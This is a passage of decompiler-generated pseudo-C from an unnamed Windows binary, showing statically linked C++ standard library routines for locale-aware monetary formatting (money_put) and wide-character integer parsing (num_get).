  void *p_Block; // eax
  int *v52; // eax
  void **v53; // eax
  int *v54; // eax
  int v55; // eax
  int v56; // esi
  void *v57; // ecx
  void *v58; // ecx
  int v60; // [esp-8h] [ebp-104h]
  const struct std::locale *v61; // [esp-4h] [ebp-100h]
  unsigned int v62; // [esp-4h] [ebp-100h]
  char v63[8]; // [esp+10h] [ebp-ECh] BYREF
  char v64[8]; // [esp+18h] [ebp-E4h] BYREF
  char v65[8]; // [esp+20h] [ebp-DCh] BYREF
  char v66[8]; // [esp+28h] [ebp-D4h] BYREF
  char v67[8]; // [esp+30h] [ebp-CCh] BYREF
  char v68[8]; // [esp+38h] [ebp-C4h] BYREF
  char v69[8]; // [esp+40h] [ebp-BCh] BYREF
  char v70[8]; // [esp+48h] [ebp-B4h] BYREF
  char v71[8]; // [esp+50h] [ebp-ACh] BYREF
  int v72; // [esp+58h] [ebp-A4h]
  int v73; // [esp+5Ch] [ebp-A0h] BYREF
  int v74; // [esp+60h] [ebp-9Ch]
  int v75; // [esp+64h] [ebp-98h]
  wchar_t C[2]; // [esp+68h] [ebp-94h]
  unsigned int v77; // [esp+6Ch] [ebp-90h]
  int v78; // [esp+70h] [ebp-8Ch]
  unsigned int v79; // [esp+74h] [ebp-88h]
  void *p_Src; // [esp+78h] [ebp-84h] BYREF
  char v81[4]; // [esp+7Ch] [ebp-80h] BYREF
  unsigned int v82; // [esp+80h] [ebp-7Ch] BYREF
  char v83; // [esp+87h] [ebp-75h]
  struct std::_Facet_base *v84; // [esp+88h] [ebp-74h]
  char v85[24]; // [esp+8Ch] [ebp-70h] BYREF
  int v86[5]; // [esp+A4h] [ebp-58h] BYREF
  unsigned int v87; // [esp+B8h] [ebp-44h]
  void *Block; // [esp+BCh] [ebp-40h] BYREF
  int v89; // [esp+CCh] [ebp-30h]
  unsigned int v90; // [esp+D0h] [ebp-2Ch]
  void *v91[4]; // [esp+D4h] [ebp-28h] BYREF
  unsigned int v92; // [esp+E4h] [ebp-18h]
  unsigned int v93; // [esp+E8h] [ebp-14h]
  int v94; // [esp+F8h] [ebp-4h]
  int v95; // [esp+108h] [ebp+Ch]
  int v96; // [esp+10Ch] [ebp+10h]

  v78 = a6;
  v72 = a1;
  v75 = a5;
  *(_DWORD *)C = a14;
  v61 = *(const struct std::locale **)(a5 + 48);
  v94 = 0;
  std::locale::locale((std::locale *)&v73, v61);
  if ( a4 )
  {
    LOBYTE(v94) = 1;
    v14 = sub_436127((std::locale *)&v73);
  }
  else
  {
    LOBYTE(v94) = 2;
    v14 = sub_4361BC((std::locale *)&v73);
  }
  v84 = v14;
  LOBYTE(v94) = 0;
  sub_42DEE0(&v73);
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v14 + 20))(v14, v86);
  LOBYTE(v94) = 3;
  v15 = abs32(unknown_libname_81(v14));
  v79 = v15;
  if ( a12 > v15 )
  {
    v16 = v86;
    if ( v87 >= 0x10 )
      v16 = (int *)v86[0];
    if ( *(_BYTE *)v16 != 127 )
    {
      v17 = (char *)v86;
      if ( v87 >= 0x10 )
        v17 = (char *)v86[0];
      if ( *v17 > 0 )
      {
        v18 = v86;
        v19 = unknown_libname_32(v84);
        v82 = v19;
        if ( v87 >= 0x10 )
          v18 = (int *)v86[0];
        v20 = a12 - v79;
        while ( 1 )
        {
          LOBYTE(v21) = *(_BYTE *)v18;
          if ( *(_BYTE *)v18 == 127 )
            break;
          if ( (char)v21 <= 0 )
            break;
          v21 = (char)v21;
          if ( (char)v21 >= v20 )
            break;
          v20 -= v21;
          std::wstring::insert(&Src, v20, 1u, v19);
          if ( *((char *)v18 + 1) > 0 )
            v18 = (int *)((char *)v18 + 1);
          v19 = v82;
        }
        v15 = v79;
      }
    }
  }
  else
  {
    std::wstring::insert(&Src, 0, v15 - a12 + 1, C[0]);
  }
  v92 = 0;
  v93 = 7;
  LOWORD(v91[0]) = 0;
  LOBYTE(v94) = 4;
  v22 = *(_DWORD *)v84;
  if ( a7 )
  {
    (*(void (__thiscall **)(struct std::_Facet_base *, unsigned int *))(v22 + 44))(v84, &v82);
    v77 = v82;
    (*(void (__thiscall **)(struct std::_Facet_base *, char *))(*(_DWORD *)v84 + 32))(v84, v85);
  }
  else
  {
    (*(void (__thiscall **)(struct std::_Facet_base *, unsigned int *))(v22 + 40))(v84, &v82);
    v77 = v82;
    (*(void (__thiscall **)(struct std::_Facet_base *, char *))(*(_DWORD *)v84 + 28))(v84, v85);
  }
  LOBYTE(v82) = 0;
  std::wstring::_Move_assign(v85, v82);
  unknown_libname_62(v85);
  v89 = 0;
  v90 = 7;
  LOWORD(Block) = 0;
  LOBYTE(v94) = 5;
  if ( (*(_BYTE *)(v75 + 20) & 8) != 0 )
  {
    (*(void (__thiscall **)(struct std::_Facet_base *, char *))(*(_DWORD *)v84 + 24))(v84, v85);
    LOBYTE(v82) = 0;
    std::wstring::_Move_assign(v85, v82);
    unknown_libname_62(v85);
  }
  v23 = 0;
  v24 = 0;
  v83 = 0;
  for ( i = 0; i < 4; ++i )
  {
    switch ( *((_BYTE *)&v77 + i) )
    {
      case ' ':
        ++v24;
        break;
      case '$':
        v24 += v89;
        continue;
      case '+':
        v24 += v92;
        continue;
      case 'v':
        if ( a12 > v15 )
          v26 = 0;
        else
          v26 = v15 - a12 + 1;
        v27 = v26 + a12 + (v15 != 0);
        v23 = v83;
        v24 += v27;
        continue;
      case 'x':
        break;
      default:
        continue;
    }
    if ( i != 3 )
    {
      v23 = 1;
      v83 = 1;
    }
  }
  if ( *(__int64 *)(v75 + 32) <= 0 || (v28 = *(_DWORD *)(v75 + 32), v28 <= v24) )
    v29 = 0;
  else
    v29 = v28 - v24;
  v30 = *(_DWORD *)(v75 + 20) & 0x1C0;
  v74 = v30;
  if ( v30 == 64 || v30 == 256 && v23 )
  {
    v33 = a3;
    v32 = a2;
  }
  else
  {
    v31 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v81, a2, a3, v78, v29);
    v29 = 0;
    v32 = *v31;
    a2 = *v31;
    v33 = v31[1];
    a3 = v33;
  }
  v34 = 0;
  v82 = 0;
  while ( 2 )
  {
    v35 = *((char *)&v77 + v34) - 32;
    if ( !v35 )
    {
      v52 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v63, v32, v33, v78, 1);
      v32 = *v52;
      a2 = *v52;
      v33 = v52[1];
      a3 = v33;
      goto LABEL_81;
    }
    v36 = v35 - 4;
    if ( !v36 )
    {
      p_Block = &Block;
      if ( v90 >= 8 )
        p_Block = Block;
      v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v64, v32, v33, p_Block, v89);
      goto LABEL_83;
    }
    v37 = v36 - 7;
    if ( !v37 )
    {
      if ( !v92 )
        goto LABEL_84;
      v50 = v91;
      if ( v93 >= 8 )
        v50 = (void **)v91[0];
      v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v65, v32, v33, v50, 1);
      goto LABEL_83;
    }
    v38 = v37 - 75;
    if ( !v38 )
    {
      if ( v15 )
      {
        if ( a12 > v15 )
        {
          v46 = a12 - v15;
          p_Src = &Src;
          v15 = v79;
          if ( a13 >= 8 )
          {
            p_Src = Src;
            v15 = v79;
          }
          v47 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v67, v32, v33, p_Src, v46);
          v95 = *v47;
          v96 = v47[1];
          v48 = unknown_libname_21(v84);
          std::ostreambuf_iterator<wchar_t>::operator=(v48);
          v49 = &Src;
          if ( a13 >= 8 )
            v49 = (void **)Src;
          v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(
                         v66,
                         v95,
                         v96,
                         (char *)v49 + 2 * (a12 - v15),
                         v15);
        }
        else
        {
          std::ostreambuf_iterator<wchar_t>::operator=(*(_DWORD *)C);
          v41 = unknown_libname_21(v84);
          std::ostreambuf_iterator<wchar_t>::operator=(v41);
          v42 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(
                         v69,
                         a2,
                         a3,
                         *(_DWORD *)C,
                         v15 - a12);
          v43 = *v42;
          v44 = v42[1];
          v45 = &Src;
          if ( a13 >= 8 )
            v45 = (void **)Src;
          v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v68, v43, v44, v45, a12);
        }
      }
      else
      {
        v39 = &Src;
        if ( a13 >= 8 )
          v39 = (void **)Src;
        v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v70, v32, v33, v39, a12);
      }
LABEL_83:
      v32 = *v40;
      a2 = *v40;
      v33 = v40[1];
      a3 = v33;
      goto LABEL_84;
    }
    if ( v38 == 2 )
    {
LABEL_81:
      if ( v74 != 256 )
        goto LABEL_84;
      v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v71, v32, v33, v78, v29);
      v29 = 0;
      goto LABEL_83;
    }
LABEL_84:
    v34 = v82 + 1;
    v82 = v34;
    if ( v34 < 4 )
      continue;
    break;
  }
  if ( v92 > 1 )
  {
    v53 = v91;
    if ( v93 >= 8 )
      v53 = (void **)v91[0];
    v54 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(
                   v71,
                   v32,
                   v33,
                   (char *)v53 + 2,
                   v92 - 1);
    v32 = *v54;
    v33 = v54[1];
  }
  v55 = v75;
  v62 = v29;
  v60 = v78;
  v56 = v72;
  *(_DWORD *)(v75 + 32) = 0;
  *(_DWORD *)(v55 + 36) = 0;
  std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v56, v32, v33, v60, v62);
  if ( v90 >= 8 )
  {
    v57 = Block;
    v82 = 2 * v90 + 2;
    p_Src = Block;
    if ( v82 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned(&p_Src, &v82);
      v57 = p_Src;
    }
    sub_44775B(v57);
  }
  v89 = 0;
  LOWORD(Block) = 0;
  v90 = 7;
  if ( v93 >= 8 )
  {
    v58 = v91[0];
    v82 = 2 * v93 + 2;
    p_Src = v91[0];
    if ( v82 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned(&p_Src, &v82);
      v58 = p_Src;
    }
    sub_44775B(v58);
  }
  v92 = 0;
  v93 = 7;
  LOWORD(v91[0]) = 0;
  sub_409CE0(v86);
  unknown_libname_62(&Src);
  return v56;
}
// 432CAB: using guessed type int __thiscall unknown_libname_21(_DWORD);
// 434016: using guessed type int __thiscall unknown_libname_32(_DWORD);
// 436BC7: using guessed type _DWORD __stdcall std::ostreambuf_iterator<wchar_t>::operator=(_DWORD);
// 43D88D: using guessed type _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD);
// 43D8E7: using guessed type _DWORD __cdecl std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E5B7: using guessed type _DWORD __cdecl std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E657: using guessed type int __thiscall unknown_libname_62(_DWORD);
// 442D28: using guessed type int __thiscall unknown_libname_81(_DWORD);
// 43D955: using guessed type char var_80[4];
// 43D955: using guessed type char var_B4[8];
// 43D955: using guessed type char var_BC[8];
// 43D955: using guessed type char var_C4[8];
// 43D955: using guessed type char var_CC[8];
// 43D955: using guessed type char var_D4[8];
// 43D955: using guessed type char var_DC[8];
// 43D955: using guessed type char var_E4[8];
// 43D955: using guessed type char var_EC[8];

//----- (0043DF86) --------------------------------------------------------
int __stdcall sub_43DF86(
        int a1,
        int a2,
        int a3,
        char a4,
        int a5,
        unsigned __int16 a6,
        char a7,
        void *Src,
        int a9,
        int a10,
        int a11,
        unsigned int a12,
        unsigned int a13,
        unsigned __int16 a14)
{
  struct std::_Facet_base *v14; // edi
  unsigned int v15; // edi
  int *v16; // eax
  char *v17; // eax
  int *v18; // edi
  wchar_t v19; // cx
  unsigned int v20; // esi
  int v21; // eax
  int v22; // esi
  char v23; // dl
  unsigned int v24; // ecx
  unsigned int i; // esi
  int v26; // edx
  unsigned int v27; // eax
  unsigned int v28; // esi
  unsigned int v29; // esi
  int v30; // eax
  int *v31; // eax
  int v32; // ecx
  int v33; // edx
  unsigned int v34; // eax
  int v35; // eax
  int v36; // eax
  int v37; // eax
  int v38; // eax
  void **v39; // eax
  int *v40; // eax
  unsigned __int16 v41; // ax
  int *v42; // eax
  int v43; // ecx
  int v44; // edx
  void **v45; // eax
  unsigned int v46; // eax
  int *v47; // eax
  unsigned __int16 v48; // ax
  void **v49; // ecx
  void **v50; // eax
  void **v51; // eax
  int *v52; // eax
  void **v53; // eax
  int *v54; // eax
  int v55; // eax
  int v56; // esi
  void *v57; // ecx
  void *v58; // ecx
  int v60; // [esp-8h] [ebp-104h]
  const struct std::locale *v61; // [esp-4h] [ebp-100h]
  unsigned int v62; // [esp-4h] [ebp-100h]
  char v63[8]; // [esp+10h] [ebp-ECh] BYREF
  char v64[8]; // [esp+18h] [ebp-E4h] BYREF
  char v65[8]; // [esp+20h] [ebp-DCh] BYREF
  char v66[8]; // [esp+28h] [ebp-D4h] BYREF
  char v67[8]; // [esp+30h] [ebp-CCh] BYREF
  char v68[8]; // [esp+38h] [ebp-C4h] BYREF
  char v69[8]; // [esp+40h] [ebp-BCh] BYREF
  char v70[8]; // [esp+48h] [ebp-B4h] BYREF
  char v71[8]; // [esp+50h] [ebp-ACh] BYREF
  int v72; // [esp+58h] [ebp-A4h]
  int v73; // [esp+5Ch] [ebp-A0h] BYREF
  int v74; // [esp+60h] [ebp-9Ch]
  int v75; // [esp+64h] [ebp-98h]
  wchar_t C[2]; // [esp+68h] [ebp-94h]
  unsigned int v77; // [esp+6Ch] [ebp-90h]
  int v78; // [esp+70h] [ebp-8Ch]
  unsigned int v79; // [esp+74h] [ebp-88h]
  void *p_Src; // [esp+78h] [ebp-84h] BYREF
  char v81[4]; // [esp+7Ch] [ebp-80h] BYREF
  unsigned int v82; // [esp+80h] [ebp-7Ch] BYREF
  char v83; // [esp+87h] [ebp-75h]
  struct std::_Facet_base *v84; // [esp+88h] [ebp-74h]
  _DWORD v85[6]; // [esp+8Ch] [ebp-70h] BYREF
  int v86[5]; // [esp+A4h] [ebp-58h] BYREF
  unsigned int v87; // [esp+B8h] [ebp-44h]
  void *Block[4]; // [esp+BCh] [ebp-40h] BYREF
  int v89; // [esp+CCh] [ebp-30h]
  unsigned int v90; // [esp+D0h] [ebp-2Ch]
  void *v91[4]; // [esp+D4h] [ebp-28h] BYREF
  unsigned int v92; // [esp+E4h] [ebp-18h]
  unsigned int v93; // [esp+E8h] [ebp-14h]
  int v94; // [esp+F8h] [ebp-4h]
  int v95; // [esp+108h] [ebp+Ch]
  int v96; // [esp+10Ch] [ebp+10h]

  v78 = a6;
  v72 = a1;
  v75 = a5;
  *(_DWORD *)C = a14;
  v61 = *(const struct std::locale **)(a5 + 48);
  v94 = 0;
  std::locale::locale((std::locale *)&v73, v61);
  if ( a4 )
  {
    LOBYTE(v94) = 1;
    v14 = sub_436251((std::locale *)&v73);
  }
  else
  {
    LOBYTE(v94) = 2;
    v14 = sub_4362E6((std::locale *)&v73);
  }
  v84 = v14;
  LOBYTE(v94) = 0;
  sub_42DEE0(&v73);
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v14 + 20))(v14, v86);
  LOBYTE(v94) = 3;
  v15 = abs32(unknown_libname_81(v14));
  v79 = v15;
  if ( a12 > v15 )
  {
    v16 = v86;
    if ( v87 >= 0x10 )
      v16 = (int *)v86[0];
    if ( *(_BYTE *)v16 != 127 )
    {
      v17 = (char *)v86;
      if ( v87 >= 0x10 )
        v17 = (char *)v86[0];
      if ( *v17 > 0 )
      {
        v18 = v86;
        v19 = unknown_libname_32(v84);
        v82 = v19;
        if ( v87 >= 0x10 )
          v18 = (int *)v86[0];
        v20 = a12 - v79;
        while ( 1 )
        {
          LOBYTE(v21) = *(_BYTE *)v18;
          if ( *(_BYTE *)v18 == 127 )
            break;
          if ( (char)v21 <= 0 )
            break;
          v21 = (char)v21;
          if ( (char)v21 >= v20 )
            break;
          v20 -= v21;
          std::wstring::insert(&Src, v20, 1u, v19);
          if ( *((char *)v18 + 1) > 0 )
            v18 = (int *)((char *)v18 + 1);
          v19 = v82;
        }
        v15 = v79;
      }
    }
  }
  else
  {
    std::wstring::insert(&Src, 0, v15 - a12 + 1, C[0]);
  }
  v92 = 0;
  v93 = 7;
  LOWORD(v91[0]) = 0;
  LOBYTE(v94) = 4;
  v22 = *(_DWORD *)v84;
  if ( a7 )
  {
    (*(void (__thiscall **)(struct std::_Facet_base *, unsigned int *))(v22 + 44))(v84, &v82);
    v77 = v82;
    (*(void (__thiscall **)(struct std::_Facet_base *, _DWORD *))(*(_DWORD *)v84 + 32))(v84, v85);
  }
  else
  {
    (*(void (__thiscall **)(struct std::_Facet_base *, unsigned int *))(v22 + 40))(v84, &v82);
    v77 = v82;
    (*(void (__thiscall **)(struct std::_Facet_base *, _DWORD *))(*(_DWORD *)v84 + 28))(v84, v85);
  }
  LOBYTE(v82) = 0;
  sub_405870(v91, (int)v85, v82);
  sub_4040C0(v85);
  v89 = 0;
  v90 = 7;
  LOWORD(Block[0]) = 0;
  LOBYTE(v94) = 5;
  if ( (*(_BYTE *)(v75 + 20) & 8) != 0 )
  {
    (*(void (__thiscall **)(struct std::_Facet_base *, _DWORD *))(*(_DWORD *)v84 + 24))(v84, v85);
    LOBYTE(v82) = 0;
    sub_405870(Block, (int)v85, v82);
    sub_4040C0(v85);
  }
  v23 = 0;
  v24 = 0;
  v83 = 0;
  for ( i = 0; i < 4; ++i )
  {
    switch ( *((_BYTE *)&v77 + i) )
    {
      case ' ':
        ++v24;
        break;
      case '$':
        v24 += v89;
        continue;
      case '+':
        v24 += v92;
        continue;
      case 'v':
        if ( a12 > v15 )
          v26 = 0;
        else
          v26 = v15 - a12 + 1;
        v27 = v26 + a12 + (v15 != 0);
        v23 = v83;
        v24 += v27;
        continue;
      case 'x':
        break;
      default:
        continue;
    }
    if ( i != 3 )
    {
      v23 = 1;
      v83 = 1;
    }
  }
  if ( *(__int64 *)(v75 + 32) <= 0 || (v28 = *(_DWORD *)(v75 + 32), v28 <= v24) )
    v29 = 0;
  else
    v29 = v28 - v24;
  v30 = *(_DWORD *)(v75 + 20) & 0x1C0;
  v74 = v30;
  if ( v30 == 64 || v30 == 256 && v23 )
  {
    v33 = a3;
    v32 = a2;
  }
  else
  {
    v31 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v81, a2, a3, v78, v29);
    v29 = 0;
    v32 = *v31;
    a2 = *v31;
    v33 = v31[1];
    a3 = v33;
  }
  v34 = 0;
  v82 = 0;
  while ( 2 )
  {
    v35 = *((char *)&v77 + v34) - 32;
    if ( !v35 )
    {
      v52 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v63, v32, v33, v78, 1);
      v32 = *v52;
      a2 = *v52;
      v33 = v52[1];
      a3 = v33;
      goto LABEL_81;
    }
    v36 = v35 - 4;
    if ( !v36 )
    {
      v51 = Block;
      if ( v90 >= 8 )
        v51 = (void **)Block[0];
      v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v64, v32, v33, v51, v89);
      goto LABEL_83;
    }
    v37 = v36 - 7;
    if ( !v37 )
    {
      if ( !v92 )
        goto LABEL_84;
      v50 = v91;
      if ( v93 >= 8 )
        v50 = (void **)v91[0];
      v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v65, v32, v33, v50, 1);
      goto LABEL_83;
    }
    v38 = v37 - 75;
    if ( !v38 )
    {
      if ( v15 )
      {
        if ( a12 > v15 )
        {
          v46 = a12 - v15;
          p_Src = &Src;
          v15 = v79;
          if ( a13 >= 8 )
          {
            p_Src = Src;
            v15 = v79;
          }
          v47 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v67, v32, v33, p_Src, v46);
          v95 = *v47;
          v96 = v47[1];
          v48 = unknown_libname_21(v84);
          std::ostreambuf_iterator<wchar_t>::operator=(v48);
          v49 = &Src;
          if ( a13 >= 8 )
            v49 = (void **)Src;
          v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(
                         v66,
                         v95,
                         v96,
                         (char *)v49 + 2 * (a12 - v15),
                         v15);
        }
        else
        {
          std::ostreambuf_iterator<wchar_t>::operator=(*(_DWORD *)C);
          v41 = unknown_libname_21(v84);
          std::ostreambuf_iterator<wchar_t>::operator=(v41);
          v42 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(
                         v69,
                         a2,
                         a3,
                         *(_DWORD *)C,
                         v15 - a12);
          v43 = *v42;
          v44 = v42[1];
          v45 = &Src;
          if ( a13 >= 8 )
            v45 = (void **)Src;
          v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v68, v43, v44, v45, a12);
        }
      }
      else
      {
        v39 = &Src;
        if ( a13 >= 8 )
          v39 = (void **)Src;
        v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(v70, v32, v33, v39, a12);
      }
LABEL_83:
      v32 = *v40;
      a2 = *v40;
      v33 = v40[1];
      a3 = v33;
      goto LABEL_84;
    }
    if ( v38 == 2 )
    {
LABEL_81:
      if ( v74 != 256 )
        goto LABEL_84;
      v40 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v71, v32, v33, v78, v29);
      v29 = 0;
      goto LABEL_83;
    }
LABEL_84:
    v34 = v82 + 1;
    v82 = v34;
    if ( v34 < 4 )
      continue;
    break;
  }
  if ( v92 > 1 )
  {
    v53 = v91;
    if ( v93 >= 8 )
      v53 = (void **)v91[0];
    v54 = (int *)std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(
                   v71,
                   v32,
                   v33,
                   (char *)v53 + 2,
                   v92 - 1);
    v32 = *v54;
    v33 = v54[1];
  }
  v55 = v75;
  v62 = v29;
  v60 = v78;
  v56 = v72;
  *(_DWORD *)(v75 + 32) = 0;
  *(_DWORD *)(v55 + 36) = 0;
  std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(v56, v32, v33, v60, v62);
  if ( v90 >= 8 )
  {
    v57 = Block[0];
    v82 = 2 * v90 + 2;
    p_Src = Block[0];
    if ( v82 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned(&p_Src, &v82);
      v57 = p_Src;
    }
    sub_44775B(v57);
  }
  v89 = 0;
  LOWORD(Block[0]) = 0;
  v90 = 7;
  if ( v93 >= 8 )
  {
    v58 = v91[0];
    v82 = 2 * v93 + 2;
    p_Src = v91[0];
    if ( v82 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned(&p_Src, &v82);
      v58 = p_Src;
    }
    sub_44775B(v58);
  }
  v92 = 0;
  v93 = 7;
  LOWORD(v91[0]) = 0;
  sub_409CE0(v86);
  sub_4040C0(&Src);
  return v56;
}
// 432CAB: using guessed type int __thiscall unknown_libname_21(_DWORD);
// 434016: using guessed type int __thiscall unknown_libname_32(_DWORD);
// 436BC7: using guessed type _DWORD __stdcall std::ostreambuf_iterator<wchar_t>::operator=(_DWORD);
// 43D8E7: using guessed type _DWORD __cdecl std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E5B7: using guessed type _DWORD __cdecl std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442D28: using guessed type int __thiscall unknown_libname_81(_DWORD);
// 43DF86: using guessed type _DWORD var_70[6];
// 43DF86: using guessed type char var_80[4];
// 43DF86: using guessed type char var_B4[8];
// 43DF86: using guessed type char var_BC[8];
// 43DF86: using guessed type char var_C4[8];
// 43DF86: using guessed type char var_CC[8];
// 43DF86: using guessed type char var_D4[8];
// 43DF86: using guessed type char var_DC[8];
// 43DF86: using guessed type char var_E4[8];
// 43DF86: using guessed type char var_EC[8];

//----- (0043E870) --------------------------------------------------------
int __stdcall sub_43E870(int a1, int a2, int a3, int a4)
{
  int v4; // eax

  v4 = std::_LStrcoll<unsigned short>(a1, a2, a3, a4);
  if ( v4 >= 0 )
    return v4 != 0;
  else
    return -1;
}
// 43548F: using guessed type _DWORD __cdecl std::_LStrcoll<unsigned short>(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043E8FC) --------------------------------------------------------
int __thiscall sub_43E8FC(_DWORD *this)
{
  return this[5];
}

//----- (0043E900) --------------------------------------------------------
__int16 __thiscall sub_43E900(_WORD *this)
{
  return this[6];
}

//----- (0043E90F) --------------------------------------------------------
int __thiscall sub_43E90F(_DWORD *this)
{
  return this[7];
}

//----- (0043E913) --------------------------------------------------------
int __stdcall sub_43E913(int a1, int a2, int a3, int a4, void *Src)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  unknown_libname_56(Src);
  return a1;
}

//----- (0043E933) --------------------------------------------------------
_DWORD *__stdcall sub_43E933(_DWORD *a1, int a2, int a3, int a4, _DWORD *Src)
{
  a1[4] = 0;
  a1[5] = 0;
  sub_4057F0(a1, Src);
  return a1;
}

//----- (0043EC57) --------------------------------------------------------
int *__thiscall sub_43EC57(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _WORD *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  int v13; // edi
  _WORD *v14; // eax
  int *v15; // esi
  unsigned int v16; // eax
  _WORD *v17; // ecx
  int *result; // eax
  const struct std::locale *v19; // [esp-4h] [ebp-5Ch]
  int *v20; // [esp+14h] [ebp-44h] BYREF
  int v21; // [esp+18h] [ebp-40h] BYREF
  int v22; // [esp+1Ch] [ebp-3Ch] BYREF
  _WORD *v23; // [esp+20h] [ebp-38h]
  bool v24; // [esp+27h] [ebp-31h]
  char v25; // [esp+28h] [ebp-30h] BYREF
  int v26; // [esp+29h] [ebp-2Fh] BYREF
  int v27; // [esp+54h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v19 = *(const struct std::locale **)(a7 + 48);
  v23 = a9;
  std::locale::locale((std::locale *)&v21, v19);
  v27 = 0;
  v12 = std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getifld(
          (int)this,
          (int)&v25,
          (int)&a3,
          (int)&a5,
          *(_DWORD *)(v10 + 20),
          (std::locale *)&v21);
  v27 = -1;
  v13 = v12;
  sub_42DEE0(&v21);
  if ( v25 )
  {
    v15 = (int *)&v25;
    v24 = v25 == 45;
    if ( v25 == 45 )
      v15 = &v26;
    v16 = _Stoulx(v15, &v20, v13, &v22);
    v17 = v23;
    *v23 = v16;
    if ( v20 == v15 || v22 || v16 > 0xFFFF )
    {
      *v11 = 2;
      *v17 = -1;
    }
    else if ( v24 )
    {
      *v17 = -(__int16)v16;
    }
  }
  else
  {
    v14 = v23;
    *v11 = 2;
    *v14 = 0;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);
// 446626: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043ED45) --------------------------------------------------------
_DWORD *__stdcall sub_43ED45(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8)
{
  int *v8; // eax
  int v9; // esi
  int v10; // edx
  _DWORD *result; // eax
  char v12[8]; // [esp+4h] [ebp-Ch] BYREF
  int v13; // [esp+Ch] [ebp-4h] BYREF

  v8 = (int *)unknown_libname_66(v12, a2, a3, a4, a5, a6, a7, &v13);
  v9 = *v8;
  v10 = v8[1];
  *a8 = v13;
  result = a1;
  *a1 = v9;
  a1[1] = v10;
  return result;
}
// 43EE4C: using guessed type _DWORD __stdcall unknown_libname_66(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43ED45: using guessed type char var_C[8];

//----- (0043F13D) --------------------------------------------------------
int *__thiscall sub_43F13D(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  _DWORD *v10; // edi
  int v11; // eax
  int v12; // esi
  int v13; // eax
  _DWORD *v14; // ecx
  int *result; // eax
  const struct std::locale *v16; // [esp-4h] [ebp-54h]
  int *v17; // [esp+10h] [ebp-40h] BYREF
  int v18; // [esp+14h] [ebp-3Ch] BYREF
  int v19; // [esp+18h] [ebp-38h] BYREF
  _DWORD *v20; // [esp+1Ch] [ebp-34h]
  _BYTE v21[44]; // [esp+20h] [ebp-30h] BYREF
  int v22; // [esp+4Ch] [ebp-4h]

  v10 = a8;
  v16 = *(const struct std::locale **)(a7 + 48);
  v20 = a9;
  std::locale::locale((std::locale *)&v18, v16);
  v22 = 0;
  v11 = std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getifld(
          (int)this,
          (int)v21,
          (int)&a3,
          (int)&a5,
          2048,
          (std::locale *)&v18);
  v22 = -1;
  v12 = v11;
  sub_42DEE0(&v18);
  if ( !v21[0] )
  {
    v14 = v20;
LABEL_6:
    *v10 = 2;
    *v14 = 0;
